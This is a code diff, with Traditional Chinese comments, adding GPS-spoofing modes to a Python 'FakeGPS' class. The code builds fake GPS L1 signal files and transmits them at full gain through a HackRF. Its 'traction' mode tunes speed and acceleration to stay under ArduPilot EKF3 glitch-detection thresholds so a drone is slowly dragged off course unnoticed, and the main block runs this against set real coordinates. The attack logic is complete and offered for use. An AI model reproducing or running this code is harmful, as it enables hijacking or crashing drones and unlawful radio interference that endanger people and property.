@@ -206,6 +206,198 @@ class FakeGPS:
             print(f"[Error] 寫入 CSV 失敗: {e}")
             return False
 
+    def _generate_traction_csv(
+        self,
+        csv_file: str,
+        start_lat: float,
+        start_lon: float,
+        start_alt: float,
+        heading_deg: float,
+        target_speed_mps: float,
+        ramp_duration_s: float,
+        total_duration_s: float,
+    ) -> bool:
+        """
+        生成 EKF3 信任範圍內的牽引誘騙 CSV 軌跡。
+        速度從 0 線性加速到 target_speed_mps，確保加速度遠低於 EK3_GLITCH_ACCEL (1.5 m/s²)。
+        """
+        dt = 1.0 / self.update_rate_hz
+        steps = int(total_duration_s / dt)
+        heading_rad = math.radians(heading_deg)
+
+        accel = target_speed_mps / ramp_duration_s if ramp_duration_s > 0 else target_speed_mps / dt
+
+        lat, lon, alt = start_lat, start_lon, start_alt
+        current_speed = 0.0
+
+        try:
+            with open(csv_file, "w") as f:
+                current_time = 0.0
+                f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")
+
+                for _ in range(steps):
+                    if current_speed < target_speed_mps:
+                        current_speed = min(target_speed_mps, current_speed + accel * dt)
+
+                    distance = current_speed * dt
+                    d_north = math.cos(heading_rad) * distance
+                    d_east = math.sin(heading_rad) * distance
+                    lat, lon = self._offset_lat_lon_m(lat, lon, d_north, d_east)
+
+                    current_time += dt
+                    f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")
+
+            self.total_duration = current_time
+            print(f"[V] 牽引 CSV 生成完成: {csv_file} (時長: {self.total_duration:.1f}s)")
+            return True
+        except IOError as e:
+            print(f"[Error] 寫入牽引 CSV 失敗: {e}")
+            return False
+
+    # -------------------------------------------------------------------------
+    # 公開誘騙介面
+    # -------------------------------------------------------------------------
+
+    def spoof_fixed_point(
+        self,
+        lat: float,
+        lon: float,
+        alt: float,
+        duration_s: int = 60,
+        output_bin: str = None,
+        ephemeris_file: str = None,
+        freq: int = 1575420000,
+        sample_rate: int = 2600000,
+        tx_gain: int = 47,
+    ):
+        """
+        模式 1：固定點位 GPS 誘騙（瞬間跳躍誘騙）。
+        直接發射指定座標的靜態 GPS 信號，無人機 EKF 若超出 Glitch 半徑 (25 m) 會先抵制，
+        但最終會以 1 m/s 速率重新融合新位置。
+        """
+        if output_bin is None:
+            output_bin = os.path.join(
+                get_project_root(), "data", "fake_signal", "gps", "spoof_fixed.bin"
+            )
+
+        print(f"\n{'='*50}")
+        print(f"[模式 1] 固定點位 GPS 誘騙（瞬間跳躍）")
+        print(f"    目標座標 : {lat:.6f}, {lon:.6f}, Alt={alt:.1f}m")
+        print(f"    發射時間 : {duration_s} 秒")
+        print(f"{'='*50}")
+
+        success = self.generate_bin(
+            output_bin=output_bin,
+            ephemeris_file_path=ephemeris_file,
+            static_mode=True,
+            manual_coords=(lat, lon, alt),
+            drift_enabled=False,
+            drift_duration_s=duration_s,
+        )
+
+        if success:
+            actual_bin = output_bin.replace(".bin", "_static.bin")
+            self.transmit_bin(actual_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)
+
+    def spoof_traction(
+        self,
+        current_lat: float,
+        current_lon: float,
+        current_alt: float,
+        heading_deg: float = 0.0,
+        target_speed_mps: float = 0.5,
+        ramp_duration_s: float = 20.0,
+        total_duration_s: float = 120.0,
+        output_bin: str = None,
+        ephemeris_file: str = None,
+        freq: int = 1575420000,
+        sample_rate: int = 2600000,
+        tx_gain: int = 47,
+    ):
+        """
+        模式 2：牽引式 GPS 誘騙（在 EKF3 信任範圍內緩慢移動）。
+
+        EKF3 關鍵限制：
+          - EK3_GLITCH_RAD    = 25 m   → 位置跳躍超過此值將觸發 Glitch 保護
+          - EK3_POS_I_GATE    = 5σ     → 位置 innovation 門檻 ≈ 2.5 m（每次更新）
+          - EK3_VEL_I_GATE    = 5σ     → 速度 innovation 門檻 ≈ 2.5 m/s
+          - EK3_GLITCH_ACCEL  = 1.5 m/s² → Glitch 保護圓半徑成長率
+
+        成功條件：
+          1. 必須從無人機「真實 GPS 位置」出發，偏差 < 2.5 m
+          2. 速度建議 ≤ 1 m/s（保守）或 ≤ 2 m/s（最大）
+          3. 加速度必須 < 0.75 m/s²（EK3_GLITCH_ACCEL 的一半）
+          4. ramp_duration_s ≥ target_speed_mps / 0.75
+
+        :param current_lat:      無人機當前真實緯度
+        :param current_lon:      無人機當前真實經度
+        :param current_alt:      無人機當前真實高度 (m)
+        :param heading_deg:      誘騙移動方向 (0=正北, 90=正東)
+        :param target_speed_mps: 目標誘騙速度 (m/s)，建議 ≤ 1 m/s
+        :param ramp_duration_s:  從 0 加速到目標速度所需時間 (s)
+        :param total_duration_s: 誘騙總時長 (s)
+        """
+        EK3_VEL_GATE_MPS = 2.5   # 5σ × 0.5 m/s
+        EK3_GLITCH_ACCEL = 1.5   # m/s²
+        SAFE_ACCEL_RATIO = 0.5   # 使用閾值的一半作為安全加速度
+
+        if target_speed_mps > EK3_VEL_GATE_MPS:
+            print(
+                f"[Warning] 速度 {target_speed_mps} m/s 超過 EKF3 速度創新門檻 "
+                f"({EK3_VEL_GATE_MPS} m/s)，可能被 EKF3 拒絕！"
+            )
+
+        safe_accel = EK3_GLITCH_ACCEL * SAFE_ACCEL_RATIO
+        min_ramp = target_speed_mps / safe_accel if safe_accel > 0 else 0
+        if ramp_duration_s < min_ramp:
+            print(
+                f"[Warning] 加速時間 {ramp_duration_s:.1f}s 過短，"
+                f"加速度 {target_speed_mps/ramp_duration_s:.2f} m/s² ≥ 安全上限 {safe_accel} m/s²"
+            )
+            print(f"          建議 ramp_duration_s ≥ {min_ramp:.1f} s")
+
+        if output_bin is None:
+            output_bin = os.path.join(
+                get_project_root(), "data", "fake_signal", "gps", "spoof_traction.bin"
+            )
+
+        csv_file = os.path.splitext(output_bin)[0] + "_traction.csv"
+
+        print(f"\n{'='*50}")
+        print(f"[模式 2] 牽引式 GPS 誘騙")
+        print(f"    起始座標（無人機真實位置）: {current_lat:.6f}, {current_lon:.6f}, Alt={current_alt:.1f}m")
+        print(f"    誘騙方向 : {heading_deg}°（0=正北, 90=正東）")
+        print(f"    目標速度 : {target_speed_mps} m/s")
+        print(f"    加速時間 : {ramp_duration_s} s（加速度 {target_speed_mps/ramp_duration_s:.3f} m/s²）")
+        print(f"    總時長   : {total_duration_s} s")
+        print(f"    [EKF3]  速度門檻 ≤ {EK3_VEL_GATE_MPS} m/s | 安全加速度 ≤ {safe_accel} m/s²")
+        print(f"{'='*50}")
+
+        os.makedirs(os.path.dirname(output_bin), exist_ok=True)
+
+        ok = self._generate_traction_csv(
+            csv_file=csv_file,
+            start_lat=current_lat,
+            start_lon=current_lon,
+            start_alt=current_alt,
+            heading_deg=heading_deg,
+            target_speed_mps=target_speed_mps,
+            ramp_duration_s=ramp_duration_s,
+            total_duration_s=total_duration_s,
+        )
+        if not ok:
+            return
+
+        success = self.generate_bin(
+            output_bin=output_bin,
+            ephemeris_file_path=ephemeris_file,
+            static_mode=False,
+            csv_file=csv_file,
+        )
+
+        if success:
+            self.transmit_bin(output_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)
+
     def generate_bin(
             self,
             output_bin,
@@ -367,36 +559,34 @@ class FakeGPS:
 
 if __name__ == "__main__":
 
-    KML_PATH = os.path.join(get_project_root(), "data", "fake_path", "NMSL.kml")
-    CSV_PATH = os.path.join(get_project_root(), "data", "fake_path", "drone_motion.csv")
-    BIN_PATH = os.path.join(get_project_root(), "data", "fake_signal", "gps", "drone_motion.bin")
-    STATIC_BIN_PATH = os.path.join(get_project_root(), "data", "fake_signal", "gps", "static_point.bin")
+    simulator = FakeGPS(update_rate_hz=10.0, default_height=100.0)
 
+    # ===========================================================
+    # 模式 1：固定點位誘騙（瞬間跳躍）
+    # ===========================================================
+    # simulator.spoof_fixed_point(
+    #     lat=23.14020741597821,
+    #     lon=113.34317939905957,
+    #     alt=10.0,
+    #     duration_s=60,
+    # )
 
-    # 使用範例: 模擬無人機以 5 m/s (約 18 km/h) 飛行
-    simulator = FakeGPS(target_speed_mps=5.0, update_rate_hz=10.0, default_height=100.0)
-
-    # 2. 轉換 KML -> CSV
-    # if simulator.kml_to_csv(KML_PATH, CSV_PATH):
-        
-    # 3. 生成 .bin 檔案
-    simulator.generate_bin(
-                output_bin=STATIC_BIN_PATH,
-                static_mode=True,
-                # manual_coords=(19.685885, -155.954189, 100.0),
-                manual_coords=(23.14020741597821, 113.34317939905957, 10.0),
-                csv_file=CSV_PATH
+    # ===========================================================
+    # 模式 2：牽引式誘騙（EKF3 信任範圍內緩慢移動）
+    #
+    # 使用前請確認：
+    #   - current_lat/lon/alt 填入無人機「當前真實 GPS 位置」
+    #   - target_speed_mps ≤ 1.0 m/s（建議）或 ≤ 2.0 m/s（最大）
+    #   - ramp_duration_s ≥ target_speed_mps / 0.75（EKF3 安全加速度限制）
+    # ===========================================================
+    simulator.spoof_traction(
+        current_lat=23.14020741597821,    # 無人機當前真實緯度
+        current_lon=113.34317939905957,   # 無人機當前真實經度
+        current_alt=50.0,                 # 無人機當前真實高度 (m)
+        heading_deg=90.0,                 # 誘騙方向：正東
+        target_speed_mps=0.5,             # 目標速度：0.5 m/s（保守安全）
+        ramp_duration_s=20.0,             # 加速時間：20s → 加速度 0.025 m/s²
+        total_duration_s=180.0,           # 總誘騙時長：3 分鐘
     )
-    
-    # 4. 發射信號
-    # if success:
-    simulator.transmit_bin(
-        bin_file=STATIC_BIN_PATH,
-        freq=1575420000,       # GPS L1 頻率
-        sample_rate=2600000,   # 建議使用 2.6 MHz
-        tx_gain=47             # HackRF TX 增益 (0-47)
-    )
-    # else:
-        # print("[X] 模擬檔案生成失敗，取消發射。")
 
 
